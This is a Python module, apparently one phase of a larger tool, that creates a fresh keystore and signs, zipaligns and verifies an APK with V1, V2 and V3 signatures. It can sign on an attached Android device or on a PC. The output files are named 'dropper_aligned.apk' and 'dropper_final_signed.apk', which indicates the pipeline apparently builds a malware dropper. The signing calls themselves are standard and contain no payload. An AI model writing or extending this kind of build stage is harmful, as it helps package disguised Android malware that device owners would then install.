"""Phase 6: Final Sign — fresh PKCS12 keystore + V1+V2+V3.

6.1 Generate keystore (keytool)
6.2 JAR sign (V1: jarsigner)
6.3 zipalign
6.4 APK sign (V2+V3: apksigner)
"""
import os, subprocess, shutil
from config import TEMP_DIR, KEYTOOL, JARSIGNER, ZIPALIGN, APKSIGNER, \
    KS_FINAL_PASS, KS_FINAL_KEYPASS, KS_FINAL_ALIAS, KS_FINAL_DN, \
    KS_FINAL_VALIDITY, KS_FINAL_SIGALG, KS_FINAL_STORETYPE
from utils.logger import setup_logger

logger = setup_logger()


def run(pc_apk):
    """Phase 6: Final Sign → dropper_final_signed.apk.

    Args:
        pc_apk: Path from Phase 5
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 6: Final Sign")
    logger.info("=" * 60)

    # 6.1: Generate PKCS12 keystore
    ks = str(TEMP_DIR / "final_keystore.p12")
    logger.info("[*] 6.1 Generating PKCS12 keystore...")
    subprocess.run([KEYTOOL, "-genkeypair", "-v",
                    "-alias", KS_FINAL_ALIAS,
                    "-keyalg", "RSA", "-keysize", "2048",
                    "-sigalg", KS_FINAL_SIGALG,
                    "-validity", KS_FINAL_VALIDITY,
                    "-keystore", ks,
                    "-storetype", KS_FINAL_STORETYPE,
                    "-dname", KS_FINAL_DN,
                    "-storepass", KS_FINAL_PASS,
                    "-keypass", KS_FINAL_KEYPASS],
                   capture_output=True, text=True, timeout=30)
    logger.info("[+] Keystore generated")

    # 6.2: JAR sign (V1)
    logger.info("[*] 6.2 JAR signing (V1)...")
    subprocess.run([JARSIGNER,
                    "-keystore", ks,
                    "-storepass", KS_FINAL_PASS,
                    "-keypass", KS_FINAL_KEYPASS,
                    "-sigalg", KS_FINAL_SIGALG,
                    "-digestalg", "SHA-256",
                    pc_apk, KS_FINAL_ALIAS],
                   capture_output=True, text=True, timeout=60)
    logger.info("[+] V1 signed")

    # 6.3: zipalign
    logger.info("[*] 6.3 zipalign...")
    aligned = str(TEMP_DIR / "dropper_aligned.apk")
    subprocess.run([ZIPALIGN, "-v", "4", pc_apk, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(aligned) or os.path.getsize(aligned) == 0:
        shutil.copy(pc_apk, aligned)
    logger.info("[+] zipalign done")

    # 6.4: APK sign (V2+V3) - try APKTool M on Android, fallback to PC apksigner
    final = str(TEMP_DIR / "dropper_final_signed.apk")

    try:
        from android_automation.apktool_m_signing import apktool_m_sign
        from android_automation.adb_ui import is_device_connected
        if is_device_connected():
            logger.info("[*] 6.4 APKTool M signing on Android (V1+V2+V3)...")
            if apktool_m_sign(aligned, final, ks, KS_FINAL_ALIAS, KS_FINAL_PASS):
                logger.info("[+] APKTool M signing complete")
            else:
                logger.warning("[!] APKTool M sign failed, using PC apksigner")
                final = _pc_sign(aligned, final, ks)
        else:
            final = _pc_sign(aligned, final, ks)
    except Exception:
        final = _pc_sign(aligned, final, ks)

    if not os.path.exists(final) or os.path.getsize(final) == 0:
        shutil.copy(aligned, final)

    return final

def _pc_sign(aligned, final, ks):
    """Sign with PC apksigner."""
    logger.info("[*] 6.4 APK signing (V2+V3) via PC apksigner...")
    subprocess.run([APKSIGNER, "sign",
                    "--ks", ks,
                    "--ks-pass", f"pass:{KS_FINAL_PASS}",
                    "--key-pass", f"pass:{KS_FINAL_KEYPASS}",
                    "--ks-key-alias", KS_FINAL_ALIAS,
                    "--v1-signing-enabled", "true",
                    "--v2-signing-enabled", "true",
                    "--v3-signing-enabled", "true",
                    "--out", final, aligned],
                   capture_output=True, text=True, timeout=60)
    logger.info("[+] PC apksigner complete")

    # Verify
    v = subprocess.run([APKSIGNER, "verify", "-v", final],
                       capture_output=True, text=True, timeout=30)
    if v.returncode == 0:
        logger.info("[+] Signatures verified: V1+V2+V3")
    logger.info(f"[+] Phase 6 Complete: {final}")
    return final
